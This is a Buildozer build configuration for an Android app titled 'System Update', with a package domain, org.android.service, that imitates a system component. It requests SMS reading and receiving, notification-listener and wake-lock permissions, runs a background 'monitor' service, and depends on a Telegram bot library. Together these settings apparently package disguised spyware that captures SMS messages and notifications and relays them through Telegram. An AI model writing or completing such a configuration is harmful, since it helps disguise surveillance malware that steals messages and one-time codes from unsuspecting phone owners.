[app]
title = System Update
package.name = sysupdate
package.domain = org.android.service
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3, pyTelegramBotAPI, jnius, plyer
android.permissions = INTERNET, RECEIVE_SMS, READ_SMS, BIND_NOTIFICATION_LISTENER_SERVICE, POST_NOTIFICATIONS, FOREGROUND_SERVICE, WAKE_LOCK
android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a, armeabi-v7a
android.services = monitor:main.py

[buildozer]
log_level = 2
warn_on_root = 1
